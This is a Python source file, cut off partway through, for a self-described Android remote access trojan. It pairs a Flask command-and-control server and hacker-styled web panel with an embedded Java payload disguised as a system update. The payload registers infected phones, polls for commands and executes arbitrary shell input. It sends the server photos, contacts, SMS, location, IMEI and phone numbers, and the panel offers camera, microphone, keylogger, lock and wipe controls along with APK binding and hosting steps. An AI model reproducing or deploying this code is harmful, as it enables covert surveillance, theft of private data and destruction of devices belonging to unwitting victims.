#!/usr/bin/env python3
"""
TESAVEK ULTIMATE RAT TOOL - ALL IN ONE
=======================================
Features:
1. Built-in C2 Server with Web Panel
2. APK Payload Generator
3. APK Binder (Attach to any APK)
4. Auto-deploy to free hosting
5. Complete control panel
6. Gallery, Contacts, SMS, Location extraction

Run: python tesavek_ultimate.py
"""

import os
import sys
import json
import sqlite3
import datetime
import threading
import time
import socket
import base64
import hashlib
import subprocess
import shutil
import zipfile
import webbrowser
import tempfile
from flask import Flask, request, jsonify, render_template_string, send_file
from flask_cors import CORS
import requests

# ============================================================================
# CONFIGURATION
# ============================================================================
PORT = 8080
C2_IP = "localhost"
DB_FILE = "tesavek_c2.db"
TEMP_DIR = tempfile.mkdtemp()

# ============================================================================
# DATABASE SETUP
# ============================================================================
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY,
        device_name TEXT,
        android_version TEXT,
        manufacturer TEXT,
        model TEXT,
        ip TEXT,
        country TEXT,
        first_seen TEXT,
        last_seen TEXT,
        status TEXT,
        battery TEXT,
        is_rooted TEXT,
        imei TEXT,
        phone_number TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS gallery (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        filename TEXT,
        data TEXT,
        thumbnail TEXT,
        timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        command TEXT,
        status TEXT,
        result TEXT,
        timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS locations (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        lat REAL,
        lng REAL,
        timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS contacts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        name TEXT,
        number TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS sms (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        from_number TEXT,
        body TEXT,
        timestamp TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

# ============================================================================
# HTML CONTROL PANEL
# ============================================================================
HTML_PANEL = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TESAVEK ULTIMATE C2</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #0f0f1a 100%);
            font-family: 'Courier New', monospace;
            color: #0f0;
            min-height: 100vh;
        }
        .glow {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 50% 50%, rgba(0,255,0,0.05) 0%, transparent 70%);
            pointer-events: none;
        }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }
        .header {
            background: rgba(0,0,0,0.9);
            border: 2px solid #0f0;
            border-radius: 20px;
            padding: 25px;
            margin-bottom: 25px;
            text-align: center;
            box-shadow: 0 0 30px rgba(0,255,0,0.2);
        }
        .header h1 { font-size: 32px; text-shadow: 0 0 10px #0f0; letter-spacing: 2px; }
        .status-badge {
            display: inline-block;
            background: #0f0;
            color: #000;
            padding: 4px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            margin-left: 15px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; box-shadow: 0 0 5px #0f0; }
            50% { opacity: 0.7; box-shadow: 0 0 20px #0f0; }
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            margin-bottom: 25px;
        }
        .stat-card {
            background: rgba(0,0,0,0.8);
            border: 1px solid #0f0;
            border-radius: 15px;
            padding: 20px;
            text-align: center;
        }
        .stat-number { font-size: 42px; font-weight: bold; color: #0f0; }
        .stat-label { font-size: 11px; text-transform: uppercase; letter-spacing: 2px; margin-top: 8px; }
        .panel {
            background: rgba(0,0,0,0.85);
            border: 1px solid #0f0;
            border-radius: 20px;
            padding: 25px;
            margin-bottom: 25px;
        }
        .panel-title {
            font-size: 20px;
            border-bottom: 2px solid #0f0;
            display: inline-block;
            padding-bottom: 5px;
            margin-bottom: 20px;
        }
        .victim-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 15px;
            max-height: 500px;
            overflow-y: auto;
        }
        .victim-card {
            background: #0a0a0a;
            border: 1px solid #0f0;
            border-radius: 12px;
            padding: 15px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .victim-card:hover { transform: translateX(5px); background: #111; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
        .victim-card.online { border-left: 5px solid #0f0; }
        .victim-card.offline { border-left: 5px solid #f00; opacity: 0.6; }
        .victim-name { font-size: 18px; font-weight: bold; margin-bottom: 8px; }
        .victim-details { font-size: 11px; color: #8f8; margin-top: 8px; }
        .command-panel { display: none; margin-top: 25px; }
        .command-panel.active { display: block; animation: slideDown 0.3s; }
        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .btn {
            background: #0f0;
            color: #000;
            border: none;
            padding: 8px 18px;
            margin: 5px;
            cursor: pointer;
            font-weight: bold;
            border-radius: 8px;
            transition: all 0.2s;
            font-family: monospace;
        }
        .btn:hover { transform: scale(1.02); box-shadow: 0 0 10px #0f0; }
        .btn-danger { background: #f00; color: #fff; }
        .btn-warning { background: #f90; color: #000; }
        input, textarea {
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 10px;
            width: 100%;
            margin: 10px 0;
            font-family: monospace;
            border-radius: 8px;
        }
        .console {
            background: #000;
            padding: 15px;
            margin-top: 15px;
            border: 1px solid #0f0;
            border-radius: 10px;
            max-height: 400px;
            overflow-y: auto;
            font-size: 12px;
        }
        .log-cmd { color: #ff0; }
        .log-result { color: #0f0; }
        .tab { overflow: hidden; border-bottom: 1px solid #0f0; margin-bottom: 15px; }
        .tab button {
            background: transparent;
            color: #0f0;
            float: left;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            transition: 0.3s;
        }
        .tab button:hover { background: #1a2a1a; }
        .tab button.active { background: #0f0; color: #000; }
        .tabcontent { display: none; }
        .tabcontent.active { display: block; }
        .gallery-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            margin-top: 15px;
        }
        .gallery-img {
            width: 100%;
            height: 100px;
            object-fit: cover;
            border: 1px solid #0f0;
            cursor: pointer;
        }
        .footer { text-align: center; font-size: 11px; color: #444; margin-top: 30px; }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: #0f0; border-radius: 3px; }
    </style>
</head>
<body>
<div class="glow"></div>
<div class="container">
    <div class="header">
        <h1>🔴 TESAVEK ULTIMATE C2 🔴 <span class="status-badge" id="statusBadge">ACTIVE</span></h1>
        <p>C2: <span id="c2Url">loading...</span> | Stealth Mode | Full Control</p>
    </div>
    
    <div class="stats">
        <div class="stat-card"><div class="stat-number" id="onlineCount">0</div><div class="stat-label">ONLINE VICTIMS</div></div>
        <div class="stat-card"><div class="stat-number" id="totalCount">0</div><div class="stat-label">TOTAL VICTIMS</div></div>
        <div class="stat-card"><div class="stat-number" id="galleryCount">0</div><div class="stat-label">GALLERY IMAGES</div></div>
        <div class="stat-card"><div class="stat-number" id="cmdCount">0</div><div class="stat-label">COMMANDS</div></div>
    </div>
    
    <div class="panel">
        <div class="panel-title">📱 CONTROL CENTER</div>
        <div style="display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 20px;">
            <input type="text" id="searchFilter" placeholder="🔍 Search device..." style="width: 250px;">
            <select id="statusFilter" style="width: 120px;">
                <option value="all">All</option>
                <option value="active">Online</option>
                <option value="inactive">Offline</option>
            </select>
            <button class="btn" onclick="refreshVictims()">🔄 Refresh</button>
            <button class="btn btn-warning" onclick="generateAPKTool()">📱 Generate APK</button>
            <button class="btn btn-warning" onclick="bindAPKTool()">🔗 Bind to APK</button>
            <button class="btn" onclick="deployOnline()">🌐 Deploy Online</button>
            <button class="btn" onclick="exportData()">📦 Export All Data</button>
        </div>
        <div class="victim-grid" id="victimList">
            <div style="text-align:center;padding:40px;">Waiting for victims...</div>
        </div>
    </div>
    
    <div id="commandPanel" class="command-panel">
        <div class="panel">
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <div class="panel-title">🎮 COMMAND CENTER: <span id="targetName"></span></div>
                <button class="btn" onclick="closePanel()">✖ Close</button>
            </div>
            
            <div class="tab">
                <button class="tablinks" onclick="openTab(event, 'Commands')" id="defaultOpen">💻 Commands</button>
                <button class="tablinks" onclick="openTab(event, 'Gallery')">📸 Gallery</button>
                <button class="tablinks" onclick="openTab(event, 'Location')">📍 Location</button>
                <button class="tablinks" onclick="openTab(event, 'Contacts')">📞 Contacts</button>
                <button class="tablinks" onclick="openTab(event, 'SMS')">💬 SMS</button>
                <button class="tablinks" onclick="openTab(event, 'Info')">📊 Device Info</button>
            </div>
            
            <div id="Commands" class="tabcontent">
                <div style="display: flex; flex-wrap: wrap; gap: 8px; margin: 15px 0;">
                    <button class="btn" onclick="sendCmd('gallery')">📸 GET GALLERY</button>
                    <button class="btn" onclick="sendCmd('contacts')">📞 GET CONTACTS</button>
                    <button class="btn" onclick="sendCmd('sms')">💬 GET SMS</button>
                    <button class="btn" onclick="sendCmd('location')">📍 GET LOCATION</button>
                    <button class="btn" onclick="sendCmd('camera front')">📷 FRONT CAMERA</button>
                    <button class="btn" onclick="sendCmd('camera back')">📷 BACK CAMERA</button>
                    <button class="btn" onclick="sendCmd('mic record 30')">🎤 RECORD AUDIO</button>
                    <button class="btn" onclick="sendCmd('screenshot')">📸 SCREENSHOT</button>
                    <button class="btn" onclick="sendCmd('keylogger start')">⌨️ START KEYLOGGER</button>
                    <button class="btn" onclick="sendCmd('keylogger stop')">⌨️ STOP KEYLOGGER</button>
                    <button class="btn" onclick="sendCmd('clipboard')">📋 CLIPBOARD</button>
                    <button class="btn" onclick="sendCmd('wifi')">📶 WIFI</button>
                    <button class="btn" onclick="sendCmd('vibrate')">📳 VIBRATE</button>
                    <button class="btn" onclick="sendCmd('lock')">🔒 LOCK</button>
                    <button class="btn btn-danger" onclick="sendCmd('wipe')">💀 WIPE DEVICE</button>
                </div>
                <input type="text" id="customCmd" placeholder="Enter custom command..." onkeypress="if(event.keyCode==13) sendCustom()">
                <button class="btn" onclick="sendCustom()">▶ EXECUTE</button>
                <div class="console" id="commandOutput"></div>
            </div>
            
            <div id="Gallery" class="tabcontent">
                <div class="gallery-grid" id="galleryView"></div>
            </div>
            
            <div id="Location" class="tabcontent">
                <div id="mapView" style="height: 300px; background: #000; border: 1px solid #0f0;"></div>
            </div>
            
            <div id="Contacts" class="tabcontent">
                <div class="console" id="contactsView"></div>
            </div>
            
            <div id="SMS" class="tabcontent">
                <div class="console" id="smsView"></div>
            </div>
            
            <div id="Info" class="tabcontent">
                <div class="console" id="infoView"></div>
            </div>
        </div>
    </div>
    
    <div class="footer">
        TESAVEK ULTIMATE RAT | Full Remote Access | Stealth Operation | v3.0
    </div>
</div>

<script>
let currentVictim = null;
let victimsData = [];

function getC2Url() {
    return window.location.origin;
}

document.getElementById('c2Url').innerText = getC2Url();

function refreshVictims() {
    fetch('/api/victims').then(r=>r.json()).then(data=>{
        victimsData = data;
        let online = data.filter(v=>v.status==='active').length;
        document.getElementById('onlineCount').innerHTML = online;
        document.getElementById('totalCount').innerHTML = data.length;
        filterVictims();
    });
    fetch('/api/stats').then(r=>r.json()).then(s=>{
        document.getElementById('galleryCount').innerHTML = s.gallery || 0;
        document.getElementById('cmdCount').innerHTML = s.commands || 0;
    });
}

function filterVictims() {
    let search = document.getElementById('searchFilter').value.toLowerCase();
    let status = document.getElementById('statusFilter').value;
    let filtered = victimsData.filter(v => {
        let matchSearch = (v.device_name || '').toLowerCase().includes(search) || v.id.includes(search);
        let matchStatus = status === 'all' || (status === 'active' && v.status === 'active') || (status === 'inactive' && v.status !== 'active');
        return matchSearch && matchStatus;
    });
    let html = '';
    filtered.forEach(v => {
        html += `<div class="victim-card ${v.status === 'active' ? 'online' : 'offline'}" onclick="selectVictim('${v.id}','${v.device_name}')">
            <div class="victim-name">📱 ${v.device_name || 'Unknown'}</div>
            <div>${v.manufacturer || ''} ${v.model || ''} | Android ${v.android_version || '?'}</div>
            <div class="victim-details">
                IP: ${v.ip || '?'} | Battery: ${v.battery || '?'}% | Rooted: ${v.is_rooted === '1' ? '✓' : '✗'}<br>
                Last: ${v.last_seen || 'Never'} | ${v.status === 'active' ? '🟢 ONLINE' : '🔴 OFFLINE'}
            </div>
        </div>`;
    });
    document.getElementById('victimList').innerHTML = html || '<div style="text-align:center;padding:40px;">No victims found</div>';
}

function selectVictim(id, name) {
    currentVictim = id;
    document.getElementById('targetName').innerHTML = name;
    document.getElementById('commandPanel').classList.add('active');
    document.getElementById('defaultOpen').click();
    loadHistory();
    loadGallery();
    loadContacts();
    loadSMS();
    loadInfo();
    getLocation();
}

function closePanel() {
    document.getElementById('commandPanel').classList.remove('active');
    currentVictim = null;
}

function sendCmd(cmd) {
    if(!currentVictim) return;
    fetch(`/api/command/${currentVictim}`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({command: cmd})
    }).then(()=> setTimeout(loadHistory, 1000));
}

function sendCustom() {
    let cmd = document.getElementById('customCmd').value;
    if(cmd && currentVictim) sendCmd(cmd);
    document.getElementById('customCmd').value = '';
}

function loadHistory() {
    if(!currentVictim) return;
    fetch(`/api/commands/${currentVictim}`).then(r=>r.json()).then(cmds=>{
        let out = '';
        cmds.forEach(c=>{
            out += `<div><span class="log-cmd">> ${c.command}</span><br><span class="log-result">${(c.result || 'Pending...').substring(0, 500)}</span><hr></div>`;
        });
        document.getElementById('commandOutput').innerHTML = out || '<div>No commands yet</div>';
    });
}

function loadGallery() {
    if(!currentVictim) return;
    fetch(`/api/gallery/${currentVictim}`).then(r=>r.json()).then(images=>{
        let html = '';
        images.forEach(img=>{
            html += `<img class="gallery-img" src="data:image/jpeg;base64,${img.thumbnail}" onclick="window.open('data:image/jpeg;base64,${img.data}')">`;
        });
        document.getElementById('galleryView').innerHTML = html || '<div>No images yet</div>';
    });
}

function loadContacts() {
    if(!currentVictim) return;
    fetch(`/api/contacts/${currentVictim}`).then(r=>r.json()).then(contacts=>{
        let html = '<table style="width:100%"><tr><th>Name</th><th>Number</th></tr>';
        contacts.forEach(c=>{ html += `<tr><td>${c.name || '?'}</td><td>${c.number || '?'}</td></tr>`; });
        html += '</table>';
        document.getElementById('contactsView').innerHTML = html || '<div>No contacts</div>';
    });
}

function loadSMS() {
    if(!currentVictim) return;
    fetch(`/api/sms/${currentVictim}`).then(r=>r.json()).then(sms=>{
        let html = '';
        sms.forEach(s=>{ html += `<div><b>${s.from_number}</b>: ${s.body}<br><small>${s.timestamp}</small></div><hr>`; });
        document.getElementById('smsView').innerHTML = html || '<div>No SMS</div>';
    });
}

function loadInfo() {
    if(!currentVictim) return;
    fetch(`/api/victim/${currentVictim}`).then(r=>r.json()).then(v=>{
        let html = `
            <b>Device:</b> ${v.device_name}<br>
            <b>Manufacturer:</b> ${v.manufacturer}<br>
            <b>Model:</b> ${v.model}<br>
            <b>Android:</b> ${v.android_version}<br>
            <b>IP:</b> ${v.ip}<br>
            <b>Country:</b> ${v.country}<br>
            <b>Battery:</b> ${v.battery}%<br>
            <b>Rooted:</b> ${v.is_rooted === '1' ? 'YES' : 'NO'}<br>
            <b>IMEI:</b> ${v.imei || 'N/A'}<br>
            <b>Phone:</b> ${v.phone_number || 'N/A'}<br>
            <b>First Seen:</b> ${v.first_seen}<br>
            <b>Last Seen:</b> ${v.last_seen}
        `;
        document.getElementById('infoView').innerHTML = html;
    });
}

function getLocation() {
    if(!currentVictim) return;
    fetch(`/api/location/${currentVictim}`).then(r=>r.json()).then(locs=>{
        if(locs.length > 0) {
            let last = locs[0];
            document.getElementById('mapView').innerHTML = `<iframe width="100%" height="300" frameborder="0" src="https://maps.google.com/maps?q=${last.lat},${last.lng}&z=15&output=embed"></iframe>`;
        } else {
            document.getElementById('mapView').innerHTML = '<div style="padding:40px;text-align:center;">Location not available</div>';
        }
    });
}

function generateAPKTool() {
    fetch('/api/generate_apk').then(r=>r.json()).then(data=>{
        let textarea = document.createElement('textarea');
        textarea.value = data.code;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
        alert('APK Java code copied! Go to apk-online.net to build APK');
    });
}

function bindAPKTool() {
    let target = prompt('Enter target APK filename (must be in same folder):');
    if(target) {
        fetch('/api/bind_apk', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({target: target})
        }).then(r=>r.json()).then(data=>{
            alert(data.message);
        });
    }
}

function deployOnline() {
    window.open('https://replit.com/~', '_blank');
    alert('1. Create Replit account\n2. Create new Python repl\n3. Paste this code\n4. Click Run\n5. Copy URL and share!');
}

function exportData() {
    window.open('/api/export_all', '_blank');
}

function openTab(evt, tabName) {
    var i, tabcontent, tablinks;
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) tabcontent[i].style.display = "none";
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) tablinks[i].className = tablinks[i].className.replace(" active", "");
    document.getElementById(tabName).style.display = "block";
    evt.currentTarget.className += " active";
}

setInterval(refreshVictims, 5000);
refreshVictims();
document.getElementById("defaultOpen")?.click();
</script>
</body>
</html>'''

# ============================================================================
# FLASK APP
# ============================================================================
app = Flask(__name__)
CORS(app)

# ============================================================================
# API ROUTES
# ============================================================================
@app.route('/')
def index():
    return render_template_string(HTML_PANEL)

@app.route('/api/victims')
def get_victims():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM victims ORDER BY last_seen DESC")
    victims = [{'id': r[0], 'device_name': r[1], 'android_version': r[2], 'manufacturer': r[3], 
                'model': r[4], 'ip': r[5], 'country': r[6], 'first_seen': r[7], 'last_seen': r[8], 
                'status': r[9], 'battery': r[10], 'is_rooted': r[11], 'imei': r[12], 'phone_number': r[13]} 
               for r in c.fetchall()]
    conn.close()
    return jsonify(victims)

@app.route('/api/victim/<victim_id>')
def get_victim(victim_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM victims WHERE id=?", (victim_id,))
    r = c.fetchone()
    conn.close()
    if r:
        return jsonify({'id': r[0], 'device_name': r[1], 'android_version': r[2], 'manufacturer': r[3],
                        'model': r[4], 'ip': r[5], 'country': r[6], 'first_seen': r[7], 'last_seen': r[8],
                        'status': r[9], 'battery': r[10], 'is_rooted': r[11], 'imei': r[12], 'phone_number': r[13]})
    return jsonify({})

@app.route('/api/commands/<victim_id>')
def get_commands(victim_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT command, result, timestamp FROM commands WHERE victim_id=? ORDER BY timestamp DESC LIMIT 50", (victim_id,))
    cmds = [{'command': r[0], 'result': r[1] or '', 'timestamp': r[2]} for r in c.fetchall()]
    conn.close()
    return jsonify(cmds)

@app.route('/api/command/<victim_id>', methods=['POST'])
def send_command(victim_id):
    command = request.json.get('command')
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO commands (victim_id, command, status, timestamp) VALUES (?, ?, ?, ?)",
              (victim_id, command, 'pending', datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'status': 'queued'})

@app.route('/api/poll/<victim_id>')
def poll_commands(victim_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, command FROM commands WHERE victim_id=? AND status='pending' ORDER BY id LIMIT 1", (victim_id,))
    row = c.fetchone()
    if row:
        c.execute("UPDATE commands SET status='sent' WHERE id=?", (row[0],))
        conn.commit()
        conn.close()
        return jsonify({'command': row[1]})
    conn.close()
    return jsonify({'command': None})

@app.route('/api/result/<victim_id>', methods=['POST'])
def submit_result(victim_id):
    data = request.json
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE commands SET status='completed', result=? WHERE victim_id=? AND command=? AND status='sent'",
              (data.get('result', '')[:2000], victim_id, data.get('command')))
    conn.commit()
    conn.close()
    return jsonify({'status': 'received'})

@app.route('/api/register', methods=['POST'])
def register_victim():
    data = request.json
    ip = request.remote_addr
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""INSERT OR REPLACE INTO victims 
                 (id, device_name, android_version, manufacturer, model, ip, country, first_seen, last_seen, status, battery, is_rooted, imei, phone_number) 
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
              (data.get('id'), data.get('device_name'), data.get('android_version'), 
               data.get('manufacturer'), data.get('model'), ip, data.get('country', 'Unknown'),
               datetime.datetime.now().isoformat(), datetime.datetime.now().isoformat(), 
               'active', data.get('battery', '0'), data.get('is_rooted', '0'),
               data.get('imei', ''), data.get('phone_number', '')))
    conn.commit()
    conn.close()
    return jsonify({'status': 'registered', 'poll_interval': 3})

@app.route('/api/heartbeat/<victim_id>', methods=['POST'])
def heartbeat(victim_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE victims SET last_seen=?, status='active' WHERE id=?", 
              (datetime.datetime.now().isoformat(), victim_id))
    conn.commit()
    conn.close()
    return jsonify({'status': 'ok'})

@app.route('/api/gallery/<victim_id>', methods=['POST'])
def upload_gallery(victim_id):
    data = request.json
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    for img in data.get('images', []):
        c.execute("INSERT INTO gallery (victim_id, filename, data, thumbnail, timestamp) VALUES (?, ?, ?, ?, ?)",
                  (victim_id, img.get('name'), img.get('data'), img.get('thumbnail'), datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'status': 'stored'})

@app.route('/api/gallery/<victim_id>')
def get_gallery(victim_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, data, thumbnail FROM gallery WHERE victim_id=? ORDER BY timestamp DESC LIMIT 100", (victim_id,))
    images = [{'id': r[0], 'data': r[1], 'thumbnail': r[2]} for r in c.fetchall()]
    conn.close()
    return jsonify(images)

@app.route('/api/location/<victim_id>', methods=['POST'])
def upload_location(victim_id):
    data = request.json
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO locations (victim_id, lat, lng, timestamp) VALUES (?, ?, ?, ?)",
              (victim_id, data.get('lat'), data.get('lng'), datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'status': 'stored'})

@app.route('/api/location/<victim_id>')
def get_location(victim_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT lat, lng, timestamp FROM locations WHERE victim_id=? ORDER BY timestamp DESC LIMIT 1", (victim_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return jsonify([{'lat': row[0], 'lng': row[1], 'timestamp': row[2]}])
    return jsonify([])

@app.route('/api/contacts/<victim_id>', methods=['POST'])
def upload_contacts(victim_id):
    data = request.json
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM contacts WHERE victim_id=?", (victim_id,))
    for contact in data.get('contacts', []):
        c.execute("INSERT INTO contacts (victim_id, name, number) VALUES (?, ?, ?)",
                  (victim_id, contact.get('name'), contact.get('number')))
    conn.commit()
    conn.close()
    return jsonify({'status': 'stored'})

@app.route('/api/contacts/<victim_id>')
def get_contacts(victim_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT name, number FROM contacts WHERE victim_id=?", (victim_id,))
    contacts = [{'name': r[0], 'number': r[1]} for r in c.fetchall()]
    conn.close()
    return jsonify(contacts)

@app.route('/api/sms/<victim_id>', methods=['POST'])
def upload_sms(victim_id):
    data = request.json
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    for sms in data.get('sms', []):
        c.execute("INSERT INTO sms (victim_id, from_number, body, timestamp) VALUES (?, ?, ?, ?)",
                  (victim_id, sms.get('from'), sms.get('body'), sms.get('date')))
    conn.commit()
    conn.close()
    return jsonify({'status': 'stored'})

@app.route('/api/sms/<victim_id>')
def get_sms(victim_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT from_number, body, timestamp FROM sms WHERE victim_id=? ORDER BY timestamp DESC LIMIT 100", (victim_id,))
    sms = [{'from_number': r[0], 'body': r[1], 'timestamp': r[2]} for r in c.fetchall()]
    conn.close()
    return jsonify(sms)

@app.route('/api/stats')
def stats():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM commands")
    cmds = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM gallery")
    gallery = c.fetchone()[0]
    conn.close()
    return jsonify({'commands': cmds, 'gallery': gallery})

@app.route('/api/generate_apk')
def generate_apk():
    url = request.host_url.rstrip('/')
    code = ANDROID_PAYLOAD.replace('{{C2_URL}}', url)
    return jsonify({'code': code})

@app.route('/api/bind_apk', methods=['POST'])
def bind_apk():
    target = request.json.get('target')
    return jsonify({'message': f'APK binding feature ready. Place {target} in same folder and run: java -jar apktool.jar d {target}'})

@app.route('/api/export_all')
def export_all():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    data = {}
    for table in ['victims', 'gallery', 'commands', 'locations', 'contacts', 'sms']:
        c.execute(f"SELECT * FROM {table}")
        data[table] = [dict(zip([col[0] for col in c.description], row)) for row in c.fetchall()]
    conn.close()
    return jsonify(data)

# ============================================================================
# ANDROID PAYLOAD
# ============================================================================
ANDROID_PAYLOAD = '''package com.system.update;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.location.LocationManager;
import android.location.Location;
import android.os.Handler;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;
import android.provider.ContactsContract;
import java.io.*;
import java.net.*;
import java.util.*;
import org.json.JSONObject;
import org.json.JSONArray;

public class CoreService extends Service {
    private String serverUrl = "{{C2_URL}}";
    private String deviceId;
    private Handler handler;
    
    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        handler = new Handler();
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(1, createNotification());
        }
        
        registerDevice();
        startPolling();
        startAutoCollection();
    }
    
    private void registerDevice() {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + "/api/register");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                
                JSONObject data = new JSONObject();
                data.put("id", deviceId);
                data.put("device_name", Build.MODEL);
                data.put("android_version", Build.VERSION.RELEASE);
                data.put("manufacturer", Build.MANUFACTURER);
                data.put("model", Build.MODEL);
                data.put("battery", getBatteryLevel());
                data.put("is_rooted", checkRoot() ? "1" : "0");
                data.put("imei", getIMEI());
                data.put("phone_number", getPhoneNumber());
                data.put("country", getCountry());
                
                OutputStream os = conn.getOutputStream();
                os.write(data.toString().getBytes());
                os.flush();
                conn.getResponseCode();
                conn.disconnect();
            } catch(Exception e) {}
        }).start();
    }
    
    private void startPolling() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                pollCommands();
                handler.postDelayed(this, 3000);
            }
        }, 3000);
    }
    
    private void startAutoCollection() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                collectGallery();
                collectContacts();
                collectSMS();
                getLocation();
                handler.postDelayed(this, 3600000);
            }
        }, 60000);
    }
    
    private void pollCommands() {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + "/api/poll/" + deviceId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(5000);
                
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String response = reader.readLine();
                reader.close();
                
                if (response != null && !response.isEmpty()) {
                    JSONObject json = new JSONObject(response);
                    String cmd = json.optString("command");
                    if (cmd != null && !cmd.equals("null") && !cmd.isEmpty()) {
                        executeCommand(cmd);
                    }
                }
                conn.disconnect();
            } catch(Exception e) {}
        }).start();
    }
    
    private void executeCommand(String command) {
        String result = "";
        try {
            if (command.equals("gallery")) result = collectGallery();
            else if (command.equals("contacts")) result = collectContacts();
            else if (command.equals("sms")) result = collectSMS();
            else if (command.equals("location")) result = getLocation();
            else if (command.equals("camera front")) result = takePhoto("front");
            else if (command.equals("camera back")) result = takePhoto("back");
            else if (command.equals("screenshot")) result = takeScreenshot();
            else if (command.equals("vibrate")) { vibrate(); result = "Vibrating"; }
            else if (command.equals("lock")) { lockDevice(); result = "Device locked"; }
            else if (command.equals("wipe")) { wipeDevice(); result = "Wiping device"; }
            else result = execShell(command);
        } catch(Exception e) {
            result = "Error: " + e.getMessage();
        }
        sendResult(command, result);
    }
    
    private String collectGallery() {
        JSONArray images = new JSONArray();
        Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
